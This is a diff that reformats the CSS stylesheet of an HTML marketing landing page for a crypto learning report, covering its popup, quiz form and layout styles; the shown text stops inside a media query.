@@ -1,1111 +1,576 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My BitDegree Crypto Learning Advantage Report</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700;800&family=Inter:wght@400;500;600;700&display=swap');
-
-        :root {
-            --bg: #0B0E17;
-            --bg-soft: #10141F;
-            --panel: #141927;
-            --panel-2: #1A2032;
-            --line: rgba(255, 255, 255, 0.08);
-            --ink: #E9ECF5;
-            --ink-dim: rgba(233, 236, 245, 0.66);
-            --ink-dimmer: rgba(233, 236, 245, 0.46);
-            --violet: #8B5CF6;
-            --blue: #3B82F6;
-            --cyan: #22D3EE;
-            --lime: #A3E635;
-            --orange: #FB923C;
-            --grad: linear-gradient(120deg, var(--blue), var(--violet));
-            --radius-lg: 26px;
-            --radius-md: 18px;
-            --radius-sm: 12px;
-            --shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            color: var(--ink);
-            line-height: 1.55;
-        }
-
-        h1,
-        h2,
-        h3,
-        .display {
-            font-family: 'Space Grotesk', sans-serif;
-            color: var(--ink);
-            line-height: 1.12;
-            letter-spacing: -0.01em;
-        }
-
-        a {
-            color: inherit;
-        }
-
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 0 28px;
-        }
-
-        .eyebrow {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 700;
-            font-size: 12.5px;
-            letter-spacing: 0.07em;
-            text-transform: uppercase;
-            color: var(--cyan);
-            background: rgba(34, 211, 238, 0.10);
-            border: 1px solid rgba(34, 211, 238, 0.25);
-            padding: 7px 14px;
-            border-radius: 100px;
-        }
-
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-family: 'Space Grotesk', sans-serif;
-            font-weight: 700;
-            font-size: 16.5px;
-            padding: 16px 30px;
-            border-radius: 100px;
-            border: none;
-            cursor: pointer;
-            transition: transform .15s ease, box-shadow .15s ease, filter .15s ease;
-        }
-
-        .btn:focus-visible {
-            outline: 2px solid var(--cyan);
-            outline-offset: 3px;
-        }
-
-        .btn-primary {
-            background: var(--grad);
-            color: #fff;
-            box-shadow: 0 14px 30px rgba(139, 92, 246, 0.35);
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.08);
-        }
-
-        .btn-outline {
-            background: transparent;
-            border: 1.5px solid rgba(255, 255, 255, 0.22);
-            color: var(--ink);
-        }
-
-        .btn-outline:hover {
-            border-color: var(--cyan);
-            color: var(--cyan);
-        }
-
-        .btn-ghost {
-            background: transparent;
-            color: var(--ink-dim);
-            text-decoration: underline;
-            text-underline-offset: 3px;
-            font-weight: 600;
-            padding: 10px 6px;
-        }
-
-        .micro {
-            font-size: 12.5px;
-            color: var(--ink-dimmer);
-            font-weight: 500;
-        }
-
-        /* DEMO BAR */
-        .demo-bar {
-            position: sticky;
-            top: 0;
-            z-index: 50;
-            background: #05070C;
-            color: #fff;
-            padding: 10px 20px;
-            text-align: center;
-            font-size: 13px;
-            font-weight: 600;
-            border-bottom: 1px solid var(--line);
-        }
-
-        .demo-bar button {
-            background: var(--grad);
-            color: #fff;
-            border: none;
-            font-family: 'Space Grotesk', sans-serif;
-            font-weight: 700;
-            padding: 7px 16px;
-            border-radius: 100px;
-            cursor: pointer;
-            margin-left: 10px;
-            font-size: 13px;
-        }
-
-        /* ---------- POPUP ---------- */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(5, 7, 12, 0.78);
-            backdrop-filter: blur(4px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 100;
-            padding: 20px;
-        }
-
-        .modal-overlay.open {
-            display: flex;
-        }
-
-        .modal-card {
-            position: relative;
-            background: linear-gradient(180deg, var(--panel-2), var(--panel));
-            border: 1px solid var(--line);
-            border-radius: var(--radius-lg);
-            max-width: 460px;
-            width: 100%;
-            padding: 38px 34px 30px;
-            box-shadow: 0 40px 90px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            animation: pop .35s cubic-bezier(.2, 1.4, .4, 1);
-        }
-
-        @keyframes pop {
-            from {
-                transform: scale(.9);
-                opacity: 0;
-            }
-
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 14px;
-            right: 16px;
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid var(--line);
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            font-size: 15px;
-            cursor: pointer;
-            color: var(--ink);
-            font-weight: 700;
-        }
-
-        .modal-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(251, 146, 60, 0.14);
-            color: var(--orange);
-            border: 1px solid rgba(251, 146, 60, 0.3);
-            font-weight: 700;
-            font-size: 11.5px;
-            letter-spacing: 0.05em;
-            text-transform: uppercase;
-            padding: 6px 12px;
-            border-radius: 100px;
-            margin-bottom: 18px;
-        }
-
-        .modal-card h2 {
-            font-size: 25px;
-            margin-bottom: 12px;
-        }
-
-        .modal-card p.sub {
-            font-size: 15px;
-            color: var(--ink-dim);
-            margin-bottom: 18px;
-        }
-
-        .modal-trust {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
-            font-size: 12px;
-            color: var(--cyan);
-            font-weight: 600;
-            margin-bottom: 22px;
-        }
-
-        .modal-trust span {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .modal-card .btn-primary {
-            width: 100%;
-        }
-
-        .modal-urgency {
-            margin-top: 14px;
-            font-size: 12.5px;
-            color: var(--ink-dimmer);
-        }
-
-        .modal-dismiss {
-            margin-top: 10px;
-            font-size: 13px;
-        }
-
-        /* ---------- HERO ---------- */
-        header.hero {
-            padding: 64px 0 56px;
-            position: relative;
-            overflow: hidden;
-            background: radial-gradient(circle at 88% -10%, rgba(139, 92, 246, 0.28), transparent 50%), radial-gradient(circle at 5% 105%, rgba(34, 211, 238, 0.18), transparent 50%);
-        }
-
-        header.hero::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background-image: linear-gradient(rgba(255, 255, 255, 0.035) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.035) 1px, transparent 1px);
-            background-size: 48px 48px;
-            mask-image: radial-gradient(circle at 70% 20%, black, transparent 70%);
-            pointer-events: none;
-        }
-
-        .nav {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 48px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .logo {
-            font-family: 'Space Grotesk', sans-serif;
-            font-weight: 800;
-            font-size: 19px;
-            display: flex;
-            align-items: center;
-            gap: 9px;
-        }
-
-        .logo .mark {
-            width: 26px;
-            height: 26px;
-            border-radius: 8px;
-            background: var(--grad);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: 800;
-            color: #fff;
-        }
-
-        .hero-grid {
-            display: grid;
-            grid-template-columns: 1.15fr 0.85fr;
-            gap: 48px;
-            align-items: center;
-            position: relative;
-            z-index: 2;
-        }
-
-        .hero h1 {
-            font-size: 48px;
-            margin: 18px 0 18px;
-        }
-
-        .hero h1 .grad-text {
-            background: var(--grad);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .hero p.sub {
-            font-size: 17.5px;
-            color: var(--ink-dim);
-            max-width: 480px;
-            margin-bottom: 28px;
-        }
-
-        .hero-cta-row {
-            display: flex;
-            align-items: center;
-            gap: 18px;
-            flex-wrap: wrap;
-            margin-bottom: 14px;
-        }
-
-        .trust-row {
-            display: flex;
-            gap: 22px;
-            flex-wrap: wrap;
-            margin-top: 22px;
-        }
-
-        .trust-row .item {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            font-size: 13.5px;
-            font-weight: 600;
-            color: var(--ink-dim);
-        }
-
-        .report-mock {
-            background: var(--panel);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-lg);
-            box-shadow: var(--shadow);
-            padding: 26px;
-        }
-
-        .report-mock .rm-head {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 18px;
-        }
-
-        .rm-pill {
-            background: rgba(139, 92, 246, 0.15);
-            color: #C4B5FD;
-            font-size: 10.5px;
-            font-weight: 700;
-            padding: 5px 10px;
-            border-radius: 100px;
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-            border: 1px solid rgba(139, 92, 246, 0.3);
-        }
-
-        .rm-score {
-            display: flex;
-            align-items: baseline;
-            gap: 6px;
-            margin-bottom: 6px;
-        }
-
-        .rm-score .num {
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 42px;
-            font-weight: 800;
-            background: var(--grad);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .rm-score .label {
-            font-size: 12.5px;
-            color: var(--ink-dimmer);
-            font-weight: 600;
-        }
-
-        .rm-bar {
-            height: 9px;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 100px;
-            overflow: hidden;
-            margin-bottom: 22px;
-        }
-
-        .rm-bar>div {
-            height: 100%;
-            width: 58%;
-            background: var(--grad);
-        }
-
-        .rm-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 11px 0;
-            border-top: 1px solid var(--line);
-            font-size: 13.5px;
-            font-weight: 600;
-        }
-
-        .rm-row:first-of-type {
-            border-top: none;
-        }
-
-        .rm-row span.tag {
-            font-size: 10.5px;
-            padding: 3px 9px;
-            border-radius: 100px;
-            font-weight: 700;
-        }
-
-        .tag-gap {
-            background: rgba(251, 146, 60, 0.15);
-            color: var(--orange);
-        }
-
-        .tag-ok {
-            background: rgba(163, 230, 53, 0.14);
-            color: var(--lime);
-        }
-
-        /* ---------- SECTION SHARED ---------- */
-        section {
-            padding: 78px 0;
-        }
-
-        .section-head {
-            max-width: 620px;
-            margin-bottom: 48px;
-        }
-
-        .section-head .eyebrow {
-            margin-bottom: 14px;
-        }
-
-        .section-head h2 {
-            font-size: 34px;
-            margin-bottom: 14px;
-        }
-
-        .section-head p {
-            font-size: 16px;
-            color: var(--ink-dim);
-        }
-
-        .what-you-get {
-            background: var(--bg-soft);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-lg);
-        }
-
-        .feature-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-        }
-
-        .feature-card {
-            background: var(--panel);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-md);
-            padding: 26px;
-            transition: border-color .15s ease;
-        }
-
-        .feature-card:hover {
-            border-color: rgba(139, 92, 246, 0.4);
-        }
-
-        .feature-card .icon {
-            width: 42px;
-            height: 42px;
-            border-radius: 11px;
-            background: var(--grad);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 19px;
-            margin-bottom: 16px;
-        }
-
-        .feature-card h3 {
-            font-size: 18.5px;
-            margin-bottom: 8px;
-        }
-
-        .feature-card p {
-            font-size: 14.5px;
-            color: var(--ink-dim);
-        }
-
-        /* steps */
-        .steps {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 24px;
-        }
-
-        .step-card {
-            background: var(--panel);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-md);
-            padding: 28px;
-        }
-
-        .step-num {
-            font-family: 'Space Grotesk', sans-serif;
-            font-weight: 800;
-            font-size: 14px;
-            width: 34px;
-            height: 34px;
-            border-radius: 50%;
-            background: rgba(34, 211, 238, 0.12);
-            color: var(--cyan);
-            border: 1px solid rgba(34, 211, 238, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 16px;
-        }
-
-        .step-card h3 {
-            font-size: 18px;
-            margin-bottom: 8px;
-        }
-
-        .step-card p {
-            font-size: 14.5px;
-            color: var(--ink-dim);
-        }
-
-        /* form */
-        .form-section {
-            background: var(--bg-soft);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-lg);
-        }
-
-        .form-wrap {
-            background: var(--panel);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-lg);
-            box-shadow: var(--shadow);
-            padding: 44px;
-            max-width: 680px;
-            margin: 0 auto;
-        }
-
-        .progress-track {
-            height: 7px;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 100px;
-            margin-bottom: 30px;
-            overflow: hidden;
-        }
-
-        .progress-track>div {
-            height: 100%;
-            width: 20%;
-            background: var(--grad);
-            border-radius: 100px;
-        }
-
-        .q-block {
-            margin-bottom: 30px;
-        }
-
-        .q-block label.q-title {
-            display: block;
-            font-family: 'Space Grotesk', sans-serif;
-            font-weight: 700;
-            font-size: 16.5px;
-            margin-bottom: 14px;
-        }
-
-        .opt-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-
-        .opt {
-            border: 1.5px solid var(--line);
-            border-radius: var(--radius-sm);
-            padding: 13px 16px;
-            font-size: 13.8px;
-            font-weight: 600;
-            color: var(--ink-dim);
-            cursor: pointer;
-            transition: border-color .15s ease, background .15s ease, color .15s ease;
-            background: var(--bg-soft);
-        }
-
-        .opt:hover {
-            border-color: var(--violet);
-            color: var(--ink);
-        }
-
-        .opt.selected {
-            border-color: var(--cyan);
-            background: rgba(34, 211, 238, 0.08);
-            color: var(--cyan);
-        }
-
-        .email-field {
-            margin-bottom: 24px;
-        }
-
-        .email-field label {
-            display: block;
-            font-weight: 700;
-            font-size: 13.5px;
-            margin-bottom: 8px;
-        }
-
-        .email-field input {
-            width: 100%;
-            padding: 14px 16px;
-            border-radius: var(--radius-sm);
-            border: 1.5px solid var(--line);
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
-            background: var(--bg-soft);
-            color: var(--ink);
-        }
-
-        .email-field input::placeholder {
-            color: var(--ink-dimmer);
-        }
-
-        .email-field input:focus {
-            outline: none;
-            border-color: var(--cyan);
-        }
-
-        .form-wrap .btn-primary {
-            width: 100%;
-        }
-
-        .form-foot {
-            text-align: center;
-            margin-top: 14px;
-        }
-
-        /* credibility */
-        .credibility {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 48px;
-            align-items: center;
-        }
-
-        .stat-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 18px;
-        }
-
-        .stat-card {
-            background: var(--panel);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-md);
-            padding: 22px;
-        }
-
-        .stat-card .num {
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 28px;
-            font-weight: 800;
-            color: var(--cyan);
-        }
-
-        .stat-card .lbl {
-            font-size: 12.5px;
-            color: var(--ink-dimmer);
-            font-weight: 600;
-            margin-top: 4px;
-        }
-
-        /* final cta */
-        .final-cta {
-            background: linear-gradient(135deg, #1A1030, #0E1A2E);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-lg);
-            padding: 64px 48px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .final-cta::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at 50% 0%, rgba(139, 92, 246, 0.25), transparent 60%);
-        }
-
-        .final-cta>* {
-            position: relative;
-            z-index: 1;
-        }
-
-        .final-cta h2 {
-            font-size: 34px;
-            max-width: 640px;
-            margin: 0 auto 16px;
-        }
-
-        .final-cta p {
-            color: var(--ink-dim);
-            max-width: 540px;
-            margin: 0 auto 30px;
-            font-size: 16px;
-        }
-
-        .final-cta .micro {
-            margin-top: 14px;
-        }
-
-        /* faq */
-        .faq-item {
-            border-bottom: 1px solid var(--line);
-            padding: 22px 0;
-        }
-
-        .faq-item h3 {
-            font-size: 16.5px;
-            margin-bottom: 8px;
-        }
-
-        .faq-item p {
-            font-size: 14.5px;
-            color: var(--ink-dim);
-        }
-
-        footer {
-            padding: 36px 0;
-            text-align: center;
-            font-size: 12.5px;
-            color: var(--ink-dimmer);
-            border-top: 1px solid var(--line);
-            margin-top: 20px;
-        }
-
-        @media(max-width:860px) {
-
-            .hero-grid,
-            .credibility {
-                grid-template-columns: 1fr;
-            }
-
-            .hero h1 {
-                font-size: 34px;
-            }
-
-            .feature-grid,
-            .steps,
-            .stat-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .opt-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .form-wrap {
-                padding: 28px;
-            }
-
-            .final-cta {
-                padding: 48px 24px;
-            }
-
-            .final-cta h2 {
-                font-size: 26px;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My BitDegree Crypto Learning Advantage Report</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700;800&family=Inter:wght@400;500;600;700&display=swap');
+
+  :root{
+    --bg:#0B0E17;
+    --bg-soft:#10141F;
+    --panel:#141927;
+    --panel-2:#1A2032;
+    --line: rgba(255,255,255,0.08);
+    --ink:#E9ECF5;
+    --ink-dim: rgba(233,236,245,0.66);
+    --ink-dimmer: rgba(233,236,245,0.46);
+    --violet:#8B5CF6;
+    --blue:#3B82F6;
+    --cyan:#22D3EE;
+    --lime:#A3E635;
+    --orange:#FB923C;
+    --grad: linear-gradient(120deg, var(--blue), var(--violet));
+    --radius-lg:26px;
+    --radius-md:18px;
+    --radius-sm:12px;
+    --shadow: 0 24px 60px rgba(0,0,0,0.45);
+  }
+
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:'Inter', sans-serif;
+    background:var(--bg);
+    color:var(--ink);
+    line-height:1.55;
+  }
+  h1,h2,h3,.display{
+    font-family:'Space Grotesk', sans-serif;
+    color:var(--ink);
+    line-height:1.12;
+    letter-spacing:-0.01em;
+  }
+  a{color:inherit;}
+  .container{ max-width:1100px; margin:0 auto; padding:0 28px; }
+
+  .eyebrow{
+    display:inline-flex; align-items:center; gap:8px;
+    font-weight:700; font-size:12.5px; letter-spacing:0.07em; text-transform:uppercase;
+    color:var(--cyan);
+    background:rgba(34,211,238,0.10);
+    border:1px solid rgba(34,211,238,0.25);
+    padding:7px 14px; border-radius:100px;
+  }
+
+  .btn{
+    display:inline-flex; align-items:center; justify-content:center; gap:8px;
+    font-family:'Space Grotesk', sans-serif; font-weight:700; font-size:16.5px;
+    padding:16px 30px; border-radius:100px; border:none; cursor:pointer;
+    transition:transform .15s ease, box-shadow .15s ease, filter .15s ease;
+  }
+  .btn:focus-visible{ outline:2px solid var(--cyan); outline-offset:3px; }
+  .btn-primary{
+    background:var(--grad); color:#fff;
+    box-shadow:0 14px 30px rgba(139,92,246,0.35);
+  }
+  .btn-primary:hover{ transform:translateY(-2px); filter:brightness(1.08); }
+  .btn-outline{
+    background:transparent; border:1.5px solid rgba(255,255,255,0.22); color:var(--ink);
+  }
+  .btn-outline:hover{ border-color:var(--cyan); color:var(--cyan); }
+  .btn-ghost{
+    background:transparent; color:var(--ink-dim); text-decoration:underline; text-underline-offset:3px;
+    font-weight:600; padding:10px 6px;
+  }
+  .micro{ font-size:12.5px; color:var(--ink-dimmer); font-weight:500; }
+
+  /* DEMO BAR */
+  .demo-bar{
+    position:sticky; top:0; z-index:50;
+    background:#05070C; color:#fff; padding:10px 20px; text-align:center;
+    font-size:13px; font-weight:600; border-bottom:1px solid var(--line);
+  }
+  .demo-bar button{
+    background:var(--grad); color:#fff; border:none;
+    font-family:'Space Grotesk',sans-serif; font-weight:700;
+    padding:7px 16px; border-radius:100px; cursor:pointer; margin-left:10px; font-size:13px;
+  }
+
+  /* ---------- POPUP ---------- */
+  .modal-overlay{
+    position:fixed; inset:0; background:rgba(5,7,12,0.78);
+    backdrop-filter:blur(4px);
+    display:none; align-items:center; justify-content:center; z-index:100; padding:20px;
+  }
+  .modal-overlay.open{ display:flex; }
+  .modal-card{
+    position:relative;
+    background: linear-gradient(180deg, var(--panel-2), var(--panel));
+    border:1px solid var(--line);
+    border-radius:var(--radius-lg);
+    max-width:460px; width:100%;
+    padding:38px 34px 30px;
+    box-shadow:0 40px 90px rgba(0,0,0,0.6);
+    text-align:center;
+    animation:pop .35s cubic-bezier(.2,1.4,.4,1);
+  }
+  @keyframes pop{ from{ transform:scale(.9); opacity:0; } to{ transform:scale(1); opacity:1; } }
+  .modal-close{
+    position:absolute; top:14px; right:16px;
+    background:rgba(255,255,255,0.08); border:1px solid var(--line); width:32px; height:32px;
+    border-radius:50%; font-size:15px; cursor:pointer; color:var(--ink); font-weight:700;
+  }
+  .modal-badge{
+    display:inline-flex; align-items:center; gap:6px;
+    background:rgba(251,146,60,0.14); color:var(--orange); border:1px solid rgba(251,146,60,0.3);
+    font-weight:700; font-size:11.5px; letter-spacing:0.05em; text-transform:uppercase;
+    padding:6px 12px; border-radius:100px; margin-bottom:18px;
+  }
+  .modal-card h2{ font-size:25px; margin-bottom:12px; }
+  .modal-card p.sub{ font-size:15px; color:var(--ink-dim); margin-bottom:18px; }
+  .modal-trust{
+    display:flex; flex-wrap:wrap; gap:10px; justify-content:center;
+    font-size:12px; color:var(--cyan); font-weight:600; margin-bottom:22px;
+  }
+  .modal-trust span{ display:flex; align-items:center; gap:5px; }
+  .modal-card .btn-primary{ width:100%; }
+  .modal-urgency{ margin-top:14px; font-size:12.5px; color:var(--ink-dimmer); }
+  .modal-dismiss{ margin-top:10px; font-size:13px; }
+
+  /* ---------- HERO ---------- */
+  header.hero{
+    padding:64px 0 56px; position:relative; overflow:hidden;
+    background:
+      radial-gradient(circle at 88% -10%, rgba(139,92,246,0.28), transparent 50%),
+      radial-gradient(circle at 5% 105%, rgba(34,211,238,0.18), transparent 50%);
+  }
+  header.hero::before{
+    content:""; position:absolute; inset:0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.035) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.035) 1px, transparent 1px);
+    background-size:48px 48px;
+    mask-image:radial-gradient(circle at 70% 20%, black, transparent 70%);
+    pointer-events:none;
+  }
+  .nav{ display:flex; align-items:center; justify-content:space-between; margin-bottom:48px; position:relative; z-index:2; }
+  .logo{ font-family:'Space Grotesk',sans-serif; font-weight:800; font-size:19px; display:flex; align-items:center; gap:9px; }
+  .logo .mark{
+    width:26px; height:26px; border-radius:8px; background:var(--grad);
+    display:flex; align-items:center; justify-content:center; font-size:13px; font-weight:800; color:#fff;
+  }
+  .hero-grid{ display:grid; grid-template-columns:1.15fr 0.85fr; gap:48px; align-items:center; position:relative; z-index:2; }
+  .hero h1{ font-size:48px; margin:18px 0 18px; }
+  .hero h1 .grad-text{
+    background:var(--grad); -webkit-background-clip:text; background-clip:text; color:transparent;
+  }
+  .hero p.sub{ font-size:17.5px; color:var(--ink-dim); max-width:480px; margin-bottom:28px; }
+  .hero-cta-row{ display:flex; align-items:center; gap:18px; flex-wrap:wrap; margin-bottom:14px; }
+  .trust-row{ display:flex; gap:22px; flex-wrap:wrap; margin-top:22px; }
+  .trust-row .item{ display:flex; align-items:center; gap:7px; font-size:13.5px; font-weight:600; color:var(--ink-dim); }
+
+  .report-mock{
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--radius-lg);
+    box-shadow:var(--shadow); padding:26px;
+  }
+  .report-mock .rm-head{ display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; }
+  .rm-pill{ background:rgba(139,92,246,0.15); color:#C4B5FD; font-size:10.5px; font-weight:700; padding:5px 10px; border-radius:100px; text-transform:uppercase; letter-spacing:0.04em; border:1px solid rgba(139,92,246,0.3); }
+  .rm-score{ display:flex; align-items:baseline; gap:6px; margin-bottom:6px; }
+  .rm-score .num{ font-family:'Space Grotesk',sans-serif; font-size:42px; font-weight:800; background:var(--grad); -webkit-background-clip:text; background-clip:text; color:transparent; }
+  .rm-score .label{ font-size:12.5px; color:var(--ink-dimmer); font-weight:600; }
+  .rm-bar{ height:9px; background:rgba(255,255,255,0.08); border-radius:100px; overflow:hidden; margin-bottom:22px; }
+  .rm-bar > div{ height:100%; width:58%; background:var(--grad); }
+  .rm-row{ display:flex; justify-content:space-between; align-items:center; padding:11px 0; border-top:1px solid var(--line); font-size:13.5px; font-weight:600; }
+  .rm-row:first-of-type{ border-top:none; }
+  .rm-row span.tag{ font-size:10.5px; padding:3px 9px; border-radius:100px; font-weight:700; }
+  .tag-gap{ background:rgba(251,146,60,0.15); color:var(--orange); }
+  .tag-ok{ background:rgba(163,230,53,0.14); color:var(--lime); }
+
+  /* ---------- SECTION SHARED ---------- */
+  section{ padding:78px 0; }
+  .section-head{ max-width:620px; margin-bottom:48px; }
+  .section-head .eyebrow{ margin-bottom:14px; }
+  .section-head h2{ font-size:34px; margin-bottom:14px; }
+  .section-head p{ font-size:16px; color:var(--ink-dim); }
+
+  .what-you-get{
+    background:var(--bg-soft);
+    border:1px solid var(--line);
+    border-radius:var(--radius-lg);
+  }
+  .feature-grid{ display:grid; grid-template-columns:repeat(2,1fr); gap:20px; }
+  .feature-card{
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--radius-md); padding:26px;
+    transition:border-color .15s ease;
+  }
+  .feature-card:hover{ border-color:rgba(139,92,246,0.4); }
+  .feature-card .icon{
+    width:42px; height:42px; border-radius:11px; background:var(--grad);
+    display:flex; align-items:center; justify-content:center; font-size:19px; margin-bottom:16px;
+  }
+  .feature-card h3{ font-size:18.5px; margin-bottom:8px; }
+  .feature-card p{ font-size:14.5px; color:var(--ink-dim); }
+
+  /* steps */
+  .steps{ display:grid; grid-template-columns:repeat(3,1fr); gap:24px; }
+  .step-card{
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--radius-md); padding:28px;
+  }
+  .step-num{
+    font-family:'Space Grotesk',sans-serif; font-weight:800; font-size:14px;
+    width:34px; height:34px; border-radius:50%; background:rgba(34,211,238,0.12); color:var(--cyan);
+    border:1px solid rgba(34,211,238,0.3);
+    display:flex; align-items:center; justify-content:center; margin-bottom:16px;
+  }
+  .step-card h3{ font-size:18px; margin-bottom:8px; }
+  .step-card p{ font-size:14.5px; color:var(--ink-dim); }
+
+  /* form */
+  .form-section{ background:var(--bg-soft); border:1px solid var(--line); border-radius:var(--radius-lg); }
+  .form-wrap{
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--radius-lg);
+    box-shadow:var(--shadow); padding:44px; max-width:680px; margin:0 auto;
+  }
+  .progress-track{ height:7px; background:rgba(255,255,255,0.08); border-radius:100px; margin-bottom:30px; overflow:hidden; }
+  .progress-track > div{ height:100%; width:20%; background:var(--grad); border-radius:100px; }
+  .q-block{ margin-bottom:30px; }
+  .q-block label.q-title{
+    display:block; font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:16.5px;
+    margin-bottom:14px;
+  }
+  .opt-grid{ display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+  .opt{
+    border:1.5px solid var(--line); border-radius:var(--radius-sm); padding:13px 16px;
+    font-size:13.8px; font-weight:600; color:var(--ink-dim); cursor:pointer;
+    transition:border-color .15s ease, background .15s ease, color .15s ease;
+    background:var(--bg-soft);
+  }
+  .opt:hover{ border-color:var(--violet); color:var(--ink); }
+  .opt.selected{ border-color:var(--cyan); background:rgba(34,211,238,0.08); color:var(--cyan); }
+  .email-field{ margin-bottom:24px; }
+  .email-field label{ display:block; font-weight:700; font-size:13.5px; margin-bottom:8px; }
+  .email-field input{
+    width:100%; padding:14px 16px; border-radius:var(--radius-sm); border:1.5px solid var(--line);
+    font-size:15px; font-family:'Inter',sans-serif; background:var(--bg-soft); color:var(--ink);
+  }
+  .email-field input::placeholder{ color:var(--ink-dimmer); }
+  .email-field input:focus{ outline:none; border-color:var(--cyan); }
+  .form-wrap .btn-primary{ width:100%; }
+  .form-foot{ text-align:center; margin-top:14px; }
+
+  /* credibility */
+  .credibility{ display:grid; grid-template-columns:1fr 1fr; gap:48px; align-items:center; }
+  .stat-grid{ display:grid; grid-template-columns:1fr 1fr; gap:18px; }
+  .stat-card{ background:var(--panel); border:1px solid var(--line); border-radius:var(--radius-md); padding:22px; }
+  .stat-card .num{ font-family:'Space Grotesk',sans-serif; font-size:28px; font-weight:800; color:var(--cyan); }
+  .stat-card .lbl{ font-size:12.5px; color:var(--ink-dimmer); font-weight:600; margin-top:4px; }
+
+  /* final cta */
+  .final-cta{
+    background: linear-gradient(135deg, #1A1030, #0E1A2E);
+    border:1px solid var(--line);
+    border-radius:var(--radius-lg); padding:64px 48px; text-align:center;
+    position:relative; overflow:hidden;
+  }
+  .final-cta::before{
+    content:""; position:absolute; inset:0;
+    background:radial-gradient(circle at 50% 0%, rgba(139,92,246,0.25), transparent 60%);
+  }
+  .final-cta > *{ position:relative; z-index:1; }
+  .final-cta h2{ font-size:34px; max-width:640px; margin:0 auto 16px; }
+  .final-cta p{ color:var(--ink-dim); max-width:540px; margin:0 auto 30px; font-size:16px; }
+  .final-cta .micro{ margin-top:14px; }
+
+  /* faq */
+  .faq-item{ border-bottom:1px solid var(--line); padding:22px 0; }
+  .faq-item h3{ font-size:16.5px; margin-bottom:8px; }
+  .faq-item p{ font-size:14.5px; color:var(--ink-dim); }
+
+  footer{ padding:36px 0; text-align:center; font-size:12.5px; color:var(--ink-dimmer); border-top:1px solid var(--line); margin-top:20px; }
+
+  @media(max-width:860px){
+    .hero-grid, .credibility{ grid-template-columns:1fr; }
+    .hero h1{ font-size:34px; }
+    .feature-grid, .steps, .stat-grid{ grid-template-columns:1fr; }
+    .opt-grid{ grid-template-columns:1fr; }
